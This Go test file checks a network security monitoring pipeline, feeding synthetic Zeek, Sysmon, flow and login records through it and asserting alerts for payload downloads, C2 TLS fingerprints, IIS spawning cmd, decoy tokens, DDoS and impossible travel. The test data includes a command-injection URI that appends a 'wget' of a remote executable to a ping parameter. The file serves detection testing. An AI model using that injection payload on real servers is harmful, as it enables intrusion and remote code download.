package pipeline

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"netsa/internal/config"
	"netsa/internal/deception"
	"netsa/internal/detect"
	"netsa/internal/geo"
	"netsa/internal/intel"
	"netsa/internal/model"
	"netsa/internal/parser"
	"netsa/internal/store"
)

// P3 的验收：流量日志（Zeek ssl / files、流量记录）、主机进程日志、诱饵与应用登录经完整流水线后：
//   - 内网主机的 TLS 指纹命中情报 → 恶意外连、疑似失陷；
//   - 服务器遭受命令注入后从载荷地址下载可执行文件 → 载荷下载（严重），资产攻击链路的植入阶段；
//   - IIS 工作进程启动 cmd → 主机命令执行，疑似失陷；
//   - 两个出口地址使用同一诱饵线索 → 互相列为强关联；
//   - 入向流量突增 → 按目的地址告警的带宽型 DDoS；
//   - 同一账号 1 小时内从北京与洛杉矶登录 → 不可能的旅行。
func TestP3Pipeline(t *testing.T) {
	dir := t.TempDir()
	intelFile := filepath.Join(dir, "intel.txt")
	os.WriteFile(intelFile, []byte("ja3:72a589da586844d7f0818ce684948eea # 远控木马的 TLS 指纹\nc2-update.example\n203.0.113.200\n"), 0o600)
	db, err := intel.Load(config.IntelConfig{Blocklists: []config.BlocklistConfig{{Name: "测试情报", Path: intelFile, Kind: "c2"}}})
	if err != nil {
		t.Fatal(err)
	}
	cfg := config.Default()
	eng, err := detect.NewEngine("", cfg.Detect.SuccessMinBytes)
	if err != nil {
		t.Fatal(err)
	}
	st := store.New(200000, 20000, 5, 24*time.Hour)
	st.IntelMatch = db.Match
	st.IntelKind = db.KindOf
	dec, err := deception.Load(config.DeceptionConfig{Tokens: []string{"x-ops-key-7f3a9c"}}, "")
	if err != nil {
		t.Fatal(err)
	}
	st.DecoyLinks = dec.Links
	beh := detect.NewBehavior(cfg.Detect.Thresholds)
	beh.Geo = func(ip string) *geo.Info {
		switch ip {
		case "1.1.1.1":
			return &geo.Info{IP: ip, Country: "中国", City: "北京市", Lat: 39.9, Lon: 116.4}
		case "2.2.2.2":
			return &geo.Info{IP: ip, Country: "美国", City: "洛杉矶", Lat: 34.05, Lon: -118.24}
		}
		return &geo.Info{IP: ip, Country: "美国"}
	}
	p := &Pipeline{Engine: eng, Behavior: beh, Store: st, Intel: db, Deception: dec, RealIP: NewRealIP(cfg.RealIP)}
	in := make(chan []*model.Event, 16)
	done := p.Run(context.Background(), in, 1)

	now := time.Now().Add(-time.Hour)
	ts := func(d time.Duration) string { return fmt.Sprintf("%.6f", float64(now.Add(d).UnixMicro())/1e6) }
	a, _ := parser.NewAuto("auto", "")
	parse := func(l string) *model.Event {
		ev, ok := a.Parse(l)
		if !ok {
			t.Fatalf("无法解析: %s", l)
		}
		return ev
	}
	var evs []*model.Event
	// 命令注入：载荷让服务器下载 203.0.113.80 上的程序
	evs = append(evs, &model.Event{Kind: model.KindWeb, SrcIP: "45.33.10.20", DstIP: "10.0.0.10", Host: "www.example.com", Method: "GET",
		URI: "/api/ping?host=127.0.0.1;wget%20http://203.0.113.80/s.elf%20-O%20/tmp/s", Status: 200, Bytes: 120, UA: "curl/8.0", Time: now})
	// 2 分钟后服务器从该地址下载了可执行文件（Zeek files.log）
	evs = append(evs, parse(`{"_path":"files","ts":`+ts(2*time.Minute)+`,"fuid":"F1","id.orig_h":"10.0.0.10","id.orig_p":50001,"id.resp_h":"203.0.113.80","id.resp_p":80,`+
		`"source":"HTTP","mime_type":"application/x-executable","filename":"s.elf","is_orig":false,"total_bytes":81234,"sha256":"`+strings.Repeat("ab", 32)+`"}`))
	// 内网主机的 TLS 指纹命中情报（Zeek ssl.log）
	evs = append(evs, parse(`{"_path":"ssl","ts":`+ts(3*time.Minute)+`,"id.orig_h":"10.0.0.31","id.orig_p":50000,"id.resp_h":"198.51.100.66","id.resp_p":443,`+
		`"version":"TLSv12","cipher":"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256","server_name":"cdn.example.net","established":true,"ja3":"72a589da586844d7f0818ce684948eea"}`))
	// TLS 连接情报标记的远控域名（SNI）
	evs = append(evs, parse(`{"_path":"ssl","ts":`+ts(4*time.Minute)+`,"id.orig_h":"10.0.0.32","id.orig_p":50001,"id.resp_h":"198.51.100.67","id.resp_p":443,`+
		`"version":"TLSv13","cipher":"TLS_AES_128_GCM_SHA256","server_name":"api.c2-update.example","established":true}`))
	// IIS 工作进程启动 cmd（Sysmon 1）
	evs = append(evs, parse(`{"@timestamp":"`+now.Add(5*time.Minute).UTC().Format(time.RFC3339)+`","host":{"ip":"10.0.0.12","name":"WEB02"},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational",`+
		`"computer_name":"WEB02","event_id":1,"event_data":{"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c whoami","ParentImage":"C:\\Windows\\System32\\inetsrv\\w3wp.exe"}}}`))
	// 两个出口地址使用同一诱饵线索
	for i, ip := range []string{"198.51.100.21", "192.0.2.44"} {
		evs = append(evs, &model.Event{Kind: model.KindWeb, SrcIP: ip, Host: "www.example.com", Method: "GET", URI: "/api/ops/export?key=x-ops-key-7f3a9c",
			Status: 403, UA: fmt.Sprintf("ua-%d", i), Time: now.Add(time.Duration(6+i) * time.Minute)})
	}
	// 入向流量突增：NTP 反射（流量记录已按采样率还原）
	for i := range 300 {
		evs = append(evs, &model.Event{Kind: model.KindFirewall, Format: "sflow", SrcIP: fmt.Sprintf("198.18.%d.%d", i/200, i%200+1), SrcPort: 123, DstIP: "10.0.0.50",
			DstPort: 40000, Proto: "udp", Action: model.ActionAllow, SentBytes: 50 << 20, Packets: 100000, Sampling: 1024, Response: true, Time: now.Add(10*time.Minute + time.Duration(i)*100*time.Millisecond)})
	}
	// 单向流的应答方向不是新的连接：服务器回复攻击者（不是回连）、回复情报标记的访客（不是外连情报地址）、
	// 公网服务器发回客户端临时端口的应答（不是端口扫描）
	for i := range 40 {
		evs = append(evs, &model.Event{Kind: model.KindFirewall, Format: "netflow_v9", SrcIP: "10.0.0.10", SrcPort: 80, DstIP: "45.33.10.20", DstPort: 50000 + i, Proto: "tcp",
			Action: model.ActionAllow, SentBytes: 5000, Packets: 5, Response: true, Time: now.Add(3 * time.Minute)})
		evs = append(evs, &model.Event{Kind: model.KindFirewall, Format: "netflow_v9", SrcIP: "10.0.0.10", SrcPort: 443, DstIP: "203.0.113.200", DstPort: 40000 + i, Proto: "tcp",
			Action: model.ActionAllow, SentBytes: 5000, Packets: 5, Response: true, Time: now.Add(4 * time.Minute)})
		evs = append(evs, &model.Event{Kind: model.KindFirewall, Format: "netflow_v9", SrcIP: "93.184.216.34", SrcPort: 443, DstIP: "10.0.0.60", DstPort: 50000 + i*7, Proto: "tcp",
			Action: model.ActionAllow, SentBytes: 80000, Packets: 60, Response: true, Time: now.Add(5*time.Minute + time.Duration(i)*time.Second)})
	}
	// 同一账号 1 小时内从北京与洛杉矶登录
	for i, ip := range []string{"1.1.1.1", "2.2.2.2"} {
		evs = append(evs, parse(`{"time":"`+now.Add(time.Duration(20+60*i)*time.Minute).Format(time.RFC3339)+`","event":"user_login","username":"zhangsan","client_ip":"`+ip+`","result":"success","app":"OA"}`))
	}
	for i := 0; i < len(evs); i += 64 {
		in <- evs[i:min(i+64, len(evs))]
	}
	close(in)
	<-done

	alerts := st.Alerts(store.AlertQuery{Limit: 1000})
	find := func(rule string) *model.Alert {
		for _, x := range alerts {
			if x.RuleID == rule {
				return x
			}
		}
		return nil
	}
	if x := find("payload-download"); x == nil || x.Severity != model.SevCritical || x.SrcIP != "10.0.0.10" || !strings.Contains(x.Evidence, "45.33.10.20") {
		t.Fatalf("载荷下载: %+v", x)
	}
	if x := find("intel-tls"); x == nil || x.Category != store.CatC2 || x.SrcIP != "10.0.0.31" || x.Severity < model.SevHigh {
		t.Fatalf("TLS 指纹情报: %+v", x)
	}
	if x := find("intel-sni"); x == nil || !strings.Contains(x.Name, "TLS 连接情报标记的远控域名") || x.SrcIP != "10.0.0.32" {
		t.Fatalf("SNI 情报: %+v", x)
	}
	if x := find("proc-web-spawn"); x == nil || x.Severity != model.SevCritical || x.SrcIP != "10.0.0.12" {
		t.Fatalf("主机命令执行: %+v", x)
	}
	if x := find("bhv-ddos-bw"); x == nil || x.SrcIP != "" || !strings.Contains(x.Evidence, "NTP 反射") {
		t.Fatalf("带宽型 DDoS: %+v", x)
	}
	if x := find("auth-impossible-travel"); x == nil || x.SrcIP != "2.2.2.2" {
		t.Fatalf("不可能的旅行: %+v", x)
	}
	if x := find("decoy-token"); x == nil || x.Category != deception.Category {
		t.Fatalf("诱饵线索: %+v", x)
	}
	for _, x := range alerts {
		if x.SrcIP == "93.184.216.34" || x.SrcIP == "10.0.0.10" && (x.Category == store.CatCallback || x.Category == store.CatC2) {
			t.Fatalf("单向流的应答方向不应告警: %+v", x)
		}
	}
	// 疑似失陷：服务器（载荷落地）、IIS 主机（命令执行）、TLS 指纹命中的终端
	comp := map[string]bool{}
	for _, c := range st.CompromisedAssets() {
		comp[c.Asset] = true
	}
	for _, h := range []string{"10.0.0.10", "10.0.0.12", "10.0.0.31"} {
		if !comp[h] {
			t.Fatalf("%s 应列为疑似失陷: %v", h, comp)
		}
	}
	// 资产攻击链路：服务器的植入阶段有载荷下载，IIS 主机的突破阶段有主机命令执行
	if c := st.AssetChain("10.0.0.10"); c == nil || !slices.Contains(c.Reached, "persist") {
		t.Fatalf("服务器链路: %+v", c)
	}
	if c := st.AssetChain("10.0.0.12"); c == nil || !slices.Contains(c.Reached, "breach") {
		t.Fatalf("IIS 主机链路: %+v", c)
	}
	// 诱饵线索把两个出口地址关联起来
	d := st.IPDetail("198.51.100.21")
	linked := false
	for _, r := range d.Related.Related {
		linked = linked || r.IP == "192.0.2.44" && r.Score == 100 && strings.Contains(strings.Join(r.Reasons, "；"), "诱饵线索")
	}
	if !linked {
		t.Fatalf("同一诱饵线索的来源应列为强关联: %+v", d.Related)
	}
	// 辅助记录（ssl / files）不计入事件量
	if tot := st.Overview().Totals; tot.Aux != 3 {
		t.Fatalf("辅助记录: %+v", tot)
	}
}
